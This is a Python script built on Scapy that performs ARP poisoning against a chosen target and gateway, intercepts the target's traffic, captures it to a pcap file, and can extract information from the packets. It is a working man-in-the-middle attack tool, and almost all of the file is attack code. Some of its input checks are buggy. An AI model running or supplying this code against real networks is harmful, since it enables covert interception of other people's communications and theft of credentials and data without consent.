from scapy.all import *
import sys, threading
import extract, ratio, sniff_func, menu



def arp_poison():
    spoof = True
    print("             ############__________ARP_Poisoning_________############")

    try:
        if sys.version_info[0] < 3:
            target_ip = raw_input("\t[>] Target IP: \t\t")
            gateway_ip = raw_input("\t[>] Gateway IP \t\t")
            interface = raw_input("\t[>] Interface: (default wlo1) \t")
            packet_count = raw_input("\t[>] Packet Count: \t\t")
            flag = raw_input("\t[>] Extract information: (y/n)(default no) \t")
            fratio = raw_input("\t[>] Show Protocol Ratio: (y/n)(default no) \t")
            file = raw_input("\t[>] Path to file: (default on desktop) \t")
        else:
            target_ip = input("\t[>] Target IP: \t\t")
            gateway_ip = input("\t[>] Gateway IP \t\t")
            interface = input("\t[>] Interface: (default wlo1) \t")
            packet_count = input("\t[>] Packet Count: \t\t")
            flag = input("\t[>] Extract information: (y/n)(default no) \t")
            fratio = input("\t[>] Show Protocol Ratio: (y/n)(default no) \t")
            file = input("\t[>] Path to file: (default on desktop) \t")

        if target_ip is "": target_ip = "192.168.43.3"
        if gateway_ip is "": gateway_ip = "192.168.43.1"
        if interface is "": interface = "wlo1"
        if packet_count is "" : packet_count = 4999
        if flag is not ("y" or "yes" or "YES" or "Y"): flag = False
        else: flag = True
        if fratio is ("y" or "yes" or "YES" or "Y"): fratio = True
        else: fratio = False
        if file == "" : file = "/home/jo/Desktop/capture1.pcap"
        packet_count = int(packet_count)

    except Exception as e:
        print("[ERR]: Something went wrong with the user input. Please try again: ", e)

    conf.iface = interface
    conf.verb = 0

    global spoof

    print("\n\t\t[i] Setting up %s" % interface)

    gateway_mac = get_mac(gateway_ip)

    if gateway_mac is None:
        print("\t[-] Failed to get gateway MAC for gateway IP %s. Exiting." % gateway_ip)
        sys.exit(0)
    else: print("\t\t[+] Gateway %s is at %s" % (gateway_ip, gateway_mac))

    target_mac = get_mac(target_ip)

    if target_mac is None:
        print("\t[-] Failed to get target MAC for target IP %s. Exiting." % target_ip)
        sys.exit(0)
    else:
        print("\t\t[+] Gateway %s is at %s" % (target_ip, target_mac))

    poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
    poison_thread.start()

    try:
        print("\n\t\t[+] Starting sniffer for %d packets:\n" % packet_count)

        bpf_filter = "ip host %s" % (target_ip)
        #packets = sniff(iface=interface, prn=callback, filter="tcp", count=packet_count)

        #sniff_func.start_pcap_sniffer(interface, bpf_filter, packet_count, flag, fratio, file)

        if flag is True:
            packets = sniff(iface=interface, prn=callback, filter=bpf_filter, count=packet_count)
        else:
            packets = sniff(iface=interface, filter=bpf_filter, count=packet_count)

        print("\n\t[+] Writing packets to file.\n")
        wrpcap(file, packets)

        if fratio is True:
            ratio.p_ratio_rt(file)

    except KeyboardInterrupt:
        print("\n\n'''''''''====> keyboard interrupt-------\n\n")
        pass
    finally:
        spoof = False
        time.sleep(2)
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

        try:
            poison_thread.exit()
        except:
            pass

        print("[+] Target restored.\n")

        menu.a_thing_that_makes_it_loop()


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):

    restore_target = ARP()
    restore_target.op = 2
    restore_target.psrc = gateway_ip
    restore_target.pdst = target_ip
    restore_target.hwdst = "ff:ff:ff:ff:ff:ff"
    restore_target.hwsrc = gateway_mac

    restore_gateway = ARP()
    restore_gateway.op = 2
    restore_gateway.psrc = target_ip
    restore_gateway.pdst = gateway_ip
    restore_gateway.hwdst = "ff:ff:ff:ff:ff:ff"
    restore_gateway.hwsrc = target_mac

    send(restore_target, count=5) ## Might be useful to mention that count=5 because we want it to be restored for sure
    send(restore_gateway, count=5)


def get_mac(ip_address):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=5, retry=5)

    for s,r in responses:
        return r[Ether].src
    return None

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):

     global spoof

     poison_target = ARP()
     poison_target.op = 2
     poison_target.psrc = gateway_ip
     poison_target.pdst = target_ip
     poison_target.hwdst = target_mac

     poison_gateway = ARP()
     poison_gateway.op = 2
     poison_gateway.psrc = target_ip
     poison_gateway.pdst = gateway_ip
     poison_gateway.hwdst = gateway_mac

     print("\t\t[+] Beginning the ARP Poisoning. [CTRL-C to stop]")

     while spoof == True:
        send(poison_target)
        send(poison_gateway)

        time.sleep(2)
     if spoof == False:
         print("\t[i] spoof: FALSE")

     print("\t[+] ARP Poisoning finished.")
     return


def callback(p):
    extract.extract_info(p)








